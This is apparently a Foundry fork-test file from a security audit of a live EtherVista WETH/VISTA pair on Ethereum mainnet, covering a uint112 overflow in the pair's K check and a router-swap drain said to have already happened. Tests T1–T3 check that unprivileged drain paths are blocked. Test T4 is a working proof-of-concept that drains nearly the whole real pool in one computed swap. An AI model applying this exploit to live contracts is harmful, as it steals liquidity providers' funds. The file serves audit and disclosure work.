// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

// ============================================================================
// zombie-hunt-iii / V2-ethervista — EtherVista mainnet pair 0xfdd05552... fork audit
//
// Chain      : Ethereum mainnet
// Fork block : 26_199_454 (pinned; read 2026-10-15)
// Status     : READ-ONLY research. Fork-only. No mainnet transactions.
//
// Target     : pair 0xfdd05552F1377aA488AFed744c8024358AF02041 (WETH/VISTA)
//              factory 0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4
//              official router 0x9bD63C5D44fF28390df1EaaFD4eB4BD73E94A72a
//              routerSetter EOA 0xCA90D843288E35beeADfCe14E5F906e3F1AFc7cB
//
// Bug (verified in source, solc 0.5.16, EtherVistaPair.sol line 633):
//      require(balance0 * balance1 >= reserve0 * reserve1, "K");
//   reserve0/reserve1 are uint112. In 0.5.16 the RHS product is computed in
//   uint112 and WRAPS at 2^112 silently. With live reserves
//   r0*r1 = 1.1311e42 > 2^112, so the RHS is (r0*r1) mod 2^112 = 3.3257e33 and
//   the check is effectively inert -> a swap that drains almost the whole pool
//   passes. BUT swap() is gated by:
//      require(msg.sender == IEtherVistaFactory(factory).router(), "EtherVistaPair: FORBIDDEN");
//   so only the factory-designated router can pass crafted amountOut.
//   The official router derives outputs from UniswapV2Library.getAmountOut()
//   (no arbitrary-amountOut entry point), so TODAY an external unprivileged
//   attacker cannot over-drain. On 2026-10-09 03:46 UTC the routerSetter EOA
//   pointed factory.router() at attacker contract 0x469424b6... and 7.478 WETH
//   + 43,856 VISTA were drained (~$18.6k); router was restored 3 min later.
//
// Tests:
//   T1  unprivileged direct swap() reverts (E-U blocked)         -> PASS expected
//   T2  pair has zero skim() excess (balance == reserve)         -> PASS expected
//   T3  claimShare() pays 0 to a non-LP attacker                 -> PASS expected
//   T4  LATENT: if router() is hostile (routerSetter key), ONE swap
//       drains $69.8k leaving ~$3.8 dust (overflow proof)        -> PASS expected
// ============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface IEVFactory {
    function router() external view returns (address);
    function routerSetter() external view returns (address);
    function allPairsLength() external view returns (uint256);
}

interface IEVFactoryPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function skim(address to) external;
    function sync() external;
    function claimShare() external;
    function poolBalance() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

contract EtherVistaForkTest is Test {
    address constant PAIR    = 0xfdd05552F1377aA488AFed744c8024358AF02041;
    address constant FACTORY = 0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4;
    address constant ROUTER  = 0x9bD63C5D44fF28390df1EaaFD4eB4BD73E94A72a;
    address constant WETH    = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant VISTA   = 0xC9bCa88B04581699fAb5aa276CCafF7Df957cbbf;
    address constant SETTER  = 0xCA90D843288E35beeADfCe14E5F906e3F1AFc7cB;

    uint256 constant FORK_BLOCK = 26_199_454;

    // DefiLlama prices at test-write time (2026-10-15): WETH $2442.84, VISTA $0.440742.
    // The T4 dust-optimal b0 = 774,612,923,074,342 wei was derived from these prices.
    address attacker = address(0xA11CE);

    function setUp() public {
        vm.createSelectFork(
            vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))),
            FORK_BLOCK
        );
    }

    // ------------------------------------------------------------------
    // T1: the unprivileged drain path (arbitrary amountOut) is closed by the
    // factory.router() gate. Live values: router = official router.
    // ------------------------------------------------------------------
    function test_T1_unprivilegedSwapBlocked() public {
        assertEq(IEVFactory(FACTORY).router(), ROUTER, "factory.router is the official EtherVistaRouter");
        assertEq(IEVFactory(FACTORY).routerSetter(), SETTER, "routerSetter EOA via which router was flipped");

        (uint112 r0, uint112 r1,) = IEVFactoryPair(PAIR).getReserves();
        emit log_named_decimal_uint("pair reserve0 WETH", r0, 18);
        emit log_named_decimal_uint("pair reserve1 VISTA", r1, 18);

        // Attacker EOA/contract tries the crafted over-drain directly.
        vm.prank(attacker);
        vm.expectRevert(bytes("EtherVistaPair: FORBIDDEN"));
        IEVFactoryPair(PAIR).swap(uint256(r0) - 1, 0, attacker, new bytes(0));

        vm.prank(attacker);
        vm.expectRevert(bytes("EtherVistaPair: FORBIDDEN"));
        IEVFactoryPair(PAIR).swap(0, uint256(r1) - 1, attacker, new bytes(0));
    }

    // ------------------------------------------------------------------
    // T2: no skim() excess — balances equal reserves exactly, so the public
    // skim() extracts nothing.
    // ------------------------------------------------------------------
    function test_T2_noSkimExcess() public {
        (uint112 r0, uint112 r1,) = IEVFactoryPair(PAIR).getReserves();
        assertEq(IERC20(WETH).balanceOf(PAIR), uint256(r0), "WETH balance == reserve0");
        assertEq(IERC20(VISTA).balanceOf(PAIR), uint256(r1), "VISTA balance == reserve1");

        uint256 aWeth = IERC20(WETH).balanceOf(attacker);
        uint256 aVista = IERC20(VISTA).balanceOf(attacker);
        vm.prank(attacker);
        IEVFactoryPair(PAIR).skim(attacker);
        assertEq(IERC20(WETH).balanceOf(attacker), aWeth, "skim moved 0 WETH");
        assertEq(IERC20(VISTA).balanceOf(attacker), aVista, "skim moved 0 VISTA");
    }

    // ------------------------------------------------------------------
    // T3: claimShare() — permissionless, but pays only accumulated provider
    // shares. A non-provider address holds lp = 0 and receives nothing.
    // ------------------------------------------------------------------
    function test_T3_claimShareZeroForNonProvider() public {
        uint256 balBefore = attacker.balance;
        uint256 poolBal = IEVFactoryPair(PAIR).poolBalance();
        emit log_named_decimal_uint("poolBalance (claimable ETH pot)", poolBal, 18);

        vm.prank(attacker);
        IEVFactoryPair(PAIR).claimShare();
        assertEq(attacker.balance, balBefore, "attacker received 0 ETH via claimShare");
    }

    // ------------------------------------------------------------------
    // T4: LATENT (P-key custody, NOT unprivileged): if factory.router() were
    // the attacker's contract, the uint112-wrapped K-check lets ONE swap drain
    // 14.247091740343487 WETH + 79,383.100270513780 VISTA, leaving $3.78 dust.
    // Proves the pair is ~100% drainable the moment the router changes.
    // ------------------------------------------------------------------
    function test_T4_LATENT_hostileRouterDrains() public {
        (uint112 r0, uint112 r1,) = IEVFactoryPair(PAIR).getReserves();
        uint256 W = (uint256(r0) * uint256(r1)) % (2 ** 112);
        emit log_named_uint("wrapped K RHS (r0*r1 mod 2^112)", W);

        // Optimal hyperbola point minimizing leftover USD value
        // b0 = sqrt(W * P_VISTA/P_WETH) = 774612923074342 wei; b1 = ceil(W/b0).
        uint256 b0 = 774_612_923_074_342;
        uint256 b1 = (W + b0 - 1) / b0;
        require(b0 * b1 >= W, "product must pass wrapped check");

        uint256 out0 = uint256(r0) + 1 - b0; // +1 wei WETH dust input
        uint256 out1 = uint256(r1) - b1;
        require(out0 < r0 && out1 < r1, "outputs below stored reserves");

        uint256 attW0 = IERC20(WETH).balanceOf(address(this));
        uint256 attV0 = IERC20(VISTA).balanceOf(address(this));
        uint256 pairW0 = IERC20(WETH).balanceOf(PAIR);
        uint256 pairV0 = IERC20(VISTA).balanceOf(PAIR);

        // 1 wei WETH dust input (amount0In > 0 requirement)
        vm.deal(address(this), 1);
        IWETH(WETH).deposit{value: 1}();
        IERC20(WETH).transfer(PAIR, 1);

        // Simulate the hostile router: msg.sender == factory.router()
        vm.prank(ROUTER);
        IEVFactoryPair(PAIR).swap(out0, out1, address(this), new bytes(0));

        uint256 gotW = IERC20(WETH).balanceOf(address(this)) - attW0;
        uint256 gotV = IERC20(VISTA).balanceOf(address(this)) - attV0;
        uint256 leftW = IERC20(WETH).balanceOf(PAIR);
        uint256 leftV = IERC20(VISTA).balanceOf(PAIR);

        emit log_named_decimal_uint("attacker WETH extracted", gotW, 18);
        emit log_named_decimal_uint("attacker VISTA extracted", gotV, 18);
        emit log_named_decimal_uint("pair WETH left", leftW, 18);
        emit log_named_decimal_uint("pair VISTA left", leftV, 18);

        // ~99.995% of the pool extracted in one swap
        assertGt(gotW * 1e6, pairW0 * 999_000, "WETH drained >99.9%");
        assertGt(gotV * 1e6, pairV0 * 999_000, "VISTA drained >99.9%");
        assertLt(leftW, 1e15, "leftover WETH dust");
        assertLt(leftV, 1e19, "leftover VISTA dust");
    }
}
